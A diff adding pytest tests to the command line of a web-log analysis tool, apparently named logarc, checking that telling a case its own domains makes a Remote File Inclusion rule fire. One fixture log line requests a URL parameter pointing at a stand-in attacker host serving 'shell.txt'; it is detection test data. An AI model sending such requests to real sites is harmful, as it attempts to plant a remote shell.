@@ -11,6 +11,7 @@ from pathlib import Path
 import pytest
 from typer.testing import CliRunner
 
+from logarc.case import Case
 from logarc.cli.main import app
 
 runner = CliRunner()
@@ -137,3 +138,97 @@ def test_version_is_reported() -> None:
 
     assert result.exit_code == 0
     assert "logarc" in result.stdout
+
+
+# -- the site's own domains, which one rule needs and nothing else does -------
+#
+# The GUI asks this after a scan. These exist so the command line can answer it
+# too — the project's rule is that anything the GUI can do is scriptable, and a
+# rule that only fires for people who clicked a dialog would break it.
+
+RFI_LINES = [
+    "203.0.113.7 - - [10/Oct/2020:14:00:00 +0000] "
+    '"GET /page?url=https://evil.test/shell.txt HTTP/1.1" 200 120 "-" "curl/8.0"',
+    "203.0.113.7 - - [10/Oct/2020:14:00:05 +0000] "
+    '"GET /page?url=https://shop.test/help HTTP/1.1" 200 120 "-" "curl/8.0"',
+]
+
+
+@pytest.fixture
+def rfi_log(tmp_path: Path) -> Path:
+    path = tmp_path / "rfi.log"
+    path.write_text("\n".join(RFI_LINES) + "\n", encoding="utf-8")
+    return path
+
+
+def test_ingest_can_be_told_the_site_s_domains(rfi_log: Path, tmp_path: Path) -> None:
+    case = tmp_path / "case"
+
+    result = runner.invoke(
+        app,
+        ["ingest", str(rfi_log), "--case", str(case), "--site-host", "shop.test"],
+    )
+
+    assert result.exit_code == 0, result.output
+    assert Case.open(case).site_hosts == ("shop.test",)
+
+
+def test_site_hosts_shows_what_a_case_was_told(rfi_log: Path, tmp_path: Path) -> None:
+    case = tmp_path / "case"
+    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case)])
+
+    runner.invoke(app, ["site-hosts", "--case", str(case), "--set", "shop.test"])
+    shown = runner.invoke(app, ["site-hosts", "--case", str(case)])
+
+    assert shown.exit_code == 0, shown.output
+    assert "shop.test" in shown.output
+
+
+def test_a_case_that_was_never_asked_says_so(rfi_log: Path, tmp_path: Path) -> None:
+    """Rather than printing an empty list, which reads as a bug."""
+    case = tmp_path / "case"
+    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case)])
+
+    shown = runner.invoke(app, ["site-hosts", "--case", str(case)])
+
+    assert shown.exit_code == 0, shown.output
+    assert "no domains" in shown.output.lower()
+
+
+def test_the_answer_changes_what_analyze_reports(rfi_log: Path, tmp_path: Path) -> None:
+    """**The end-to-end claim of this whole feature.**
+
+    The same two requests, the same case, the same rules. Unanswered, the
+    off-site fetch reads as ordinary browsing; answered, it is a finding — and
+    the request to the reader's own site stays ordinary either way.
+    """
+    case = tmp_path / "case"
+    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case)])
+
+    # A wide terminal, because the activity table wraps a long rule name across
+    # four lines and the assertion below is about the name, not the layout.
+    wide = {"COLUMNS": "200"}
+    analyze = ["analyze", "--case", str(case), "--ip", "203.0.113.7"]
+
+    before = runner.invoke(app, analyze, env=wide)
+    runner.invoke(app, ["site-hosts", "--case", str(case), "--set", "shop.test"])
+    after = runner.invoke(app, analyze, env=wide)
+
+    assert before.exit_code == 0 and after.exit_code == 0
+    assert "Remote File Inclusion" not in before.output
+    assert "Remote File Inclusion" in after.output
+
+
+def test_clearing_the_domains_makes_the_rule_quiet_again(rfi_log: Path, tmp_path: Path) -> None:
+    case = tmp_path / "case"
+    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case), "--site-host", "shop.test"])
+
+    runner.invoke(app, ["site-hosts", "--case", str(case), "--clear"])
+
+    assert Case.open(case).site_hosts == ()
+    assert (
+        "Remote File Inclusion"
+        not in runner.invoke(
+            app, ["analyze", "--case", str(case), "--ip", "203.0.113.7"], env={"COLUMNS": "200"}
+        ).output
+    )
